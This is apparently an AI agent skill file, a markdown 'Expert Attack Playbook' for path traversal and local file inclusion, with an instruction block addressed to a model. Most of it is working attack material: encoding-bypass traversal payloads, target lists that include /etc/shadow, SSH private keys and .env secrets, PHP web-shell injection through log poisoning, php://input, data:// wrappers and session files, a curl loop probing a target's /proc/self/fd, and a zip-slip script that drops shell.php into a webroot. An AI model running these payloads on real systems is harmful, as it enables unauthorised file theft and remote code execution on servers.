---
name: path-traversal-lfi
description: Path traversal and LFI playbook — encoding variants (../,  %2e%2e%2f, 0x2e0x2e0x2f, URL double-encoding), LFI to RCE (log poisoning, /proc/self/fd, PHP wrappers, session files), LFI to SSRF via php://input, Windows-specific paths, and directory traversal in zip/tar archives.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Path Traversal & LFI — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Path traversal lets attackers read (and sometimes write/include) files outside the intended directory. LFI extends this to include and execute PHP files. Covers all major encoding bypasses, LFI to RCE escalation paths (log poisoning, PHP wrappers, /proc/self/fd), and archive traversal (zip slip). Base models miss the PHP wrapper chain (convert.iconv + filter) for no-file-write RCE.

## 0. RELATED ROUTING

- upload-insecure-files — upload file then include via LFI → RCE
- cmdi-command-injection — if traversal reaches shell config files
- ghost-bits-cast-attack — Java path traversal bypass via high-bit truncation

---

## 1. BASIC TRAVERSAL PAYLOADS

```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
..././..././..././etc/passwd
```

---

## 2. ENCODING BYPASS VARIANTS

### 2.1 Standard URL Encoding

```
..%2F../etc/passwd       # %2F = /
%2e%2e%2f%2e%2e%2fetc%2fpasswd  # %2e=. %2f=/
```

### 2.2 Double URL Encoding

```
..%252F..%252Fetc%252Fpasswd    # %25 = % → decoded twice: %2F → /
%252e%252e%252f                 # Double encoded .../
```

### 2.3 Unicode / UTF-8 Encoding

```
..%c0%af../etc/passwd     # Overlong UTF-8 for /
..%c1%9c../etc/passwd     # Another overlong variant
..%ef%bc%8f../etc/passwd  # Fullwidth solidus (/)
..%e0%80%af..             # 3-byte overlong encoding
```

### 2.4 Filter Bypass (Stripping ../)

When app strips `../`:

```
....//....//etc/passwd     # After stripping ../ → ../../etc/passwd
..././..././etc/passwd     # After stripping ../ → ../../etc/passwd
....\\ (Windows)
```

### 2.5 Null Byte Bypass (PHP < 5.3.4)

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg   # Null byte truncates .jpg extension check
```

### 2.6 Path Normalization Tricks

```
/etc/./passwd             # /. = current dir = /etc/passwd
/etc//passwd              # Double slash
/etc/passwd.              # Trailing dot (Windows ignores)
/etc/passwd::$DATA        # Windows ADS
```

---

## 3. LFI TARGET FILES (LINUX)

```bash
# System information
/etc/passwd                     # Users
/etc/shadow                     # Password hashes (if readable)
/etc/hostname                   # Hostname
/etc/hosts                      # Hosts file
/etc/issue                      # OS version
/proc/version                   # Kernel version

# Web server config
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/usr/local/apache2/conf/httpd.conf

# Application secrets
/var/www/html/config.php
/var/www/html/.env
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa
/root/.bash_history

# PHP session files (for session-based RCE)
/var/lib/php/sessions/sess_SESSION_ID
/tmp/sess_SESSION_ID

# Log files (for log poisoning)
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/proc/self/fd/X (1=stdout, 2=stderr, 7=nginx stderr)
```

---

## 4. LFI TO RCE — LOG POISONING

```
1. Inject PHP code into log via User-Agent:
   User-Agent: <?php system($_GET['cmd']); ?>

2. Access log file via LFI:
   ?file=../../../var/log/apache2/access.log&cmd=id
```

**Nginx access.log**:
```
# Inject via URL path (URL-decoded into log):
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
# Then: ?file=../../../var/log/nginx/access.log&cmd=id
```

---

## 5. LFI TO RCE — /PROC/SELF/FD

Linux `/proc/self/fd/` contains file descriptors open by the current process:

```bash
# Find which fd contains error log / access log:
for i in $(seq 0 50); do
  curl "http://target/vuln.php?file=/proc/self/fd/$i" 2>&1
done

# Common: fd/2 = stderr, fd/7 = error log in some configs
# After finding the right fd, inject PHP into it and include
```

---

## 6. PHP WRAPPERS FOR LFI

```php
# Read files as base64 (bypass security checks):
?file=php://filter/convert.base64-encode/resource=/etc/passwd
# Decode result: base64 -d output

# Read files with encoding chains:
?file=php://filter/read=string.rot13/resource=/etc/passwd

# PHP execution from stdin:
?file=php://input
# POST body: <?php system('id'); ?>

# Data wrapper (run inline PHP):
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# Decoded: <?php system('id'); ?>

# Zip wrapper (if zip upload possible):
?file=zip://uploads/shell.zip%23shell.php
```

### PHP Filter Chain (No File Write RCE)

A chain of filter conversions can generate arbitrary PHP content without writing a file:

```bash
# Tool: php_filter_chain_generator
# https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# Outputs a php://filter chain that, when included, decodes to PHP code

# Example output (truncated):
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...&cmd=id
```

---

## 7. PHP SESSION FILE INCLUSION

```bash
# 1. Find PHP session cookie: PHPSESSID=abc123
# 2. Set session variable to PHP code via controllable session field:
#    username=<?php system($_GET['cmd']); ?>
# 3. Include session file:
?file=/var/lib/php/sessions/sess_abc123&cmd=id
```

---

## 8. WINDOWS-SPECIFIC PATHS

```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\W3SVC1\*.log
C:\Windows\Temp\php*
C:\Users\Administrator\Desktop\flag.txt
C:\xampp\htdocs\*.php
C:\wamp\www\*.php
C:\ProgramData\MySQL\MySQL Server\data\*.ibd
```

---

## 9. ZIP SLIP (ARCHIVE TRAVERSAL)

Malicious zip/tar containing path traversal in filename:

```python
import zipfile

# Create zip with traversal path:
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.write('shell.php', '../../../../var/www/html/shell.php')

# When server extracts evil.zip without sanitizing paths,
# shell.php lands in webroot
```

**Tools**:
```bash
# evilarc: create malicious archives
evilarc.py --os linux -p 5 shell.php
# Creates zip with ../../../../../../../../shell.php path
```

---

## 10. TESTING CHECKLIST

```
□ Identify file parameter: ?file=, ?path=, ?template=, ?page=, ?load=, ?doc=
□ Test: ?file=../../../etc/passwd (look for root: in response)
□ Test encoding variants if basic traversal is filtered
□ Test null byte if PHP < 5.3.4
□ Test /proc/self/environ (may contain HTTP headers with injected PHP)
□ Test PHP wrappers: php://filter, php://input, data://
□ Check for log poisoning via User-Agent injection
□ Check for zip/archive upload → zip slip extraction
□ Check if /proc/self/fd/ accessible → find log fd
□ For PHP apps: test php_filter_chain for no-write RCE
□ Enumerate session files via /var/lib/php/sessions/sess_SESSIONID
```
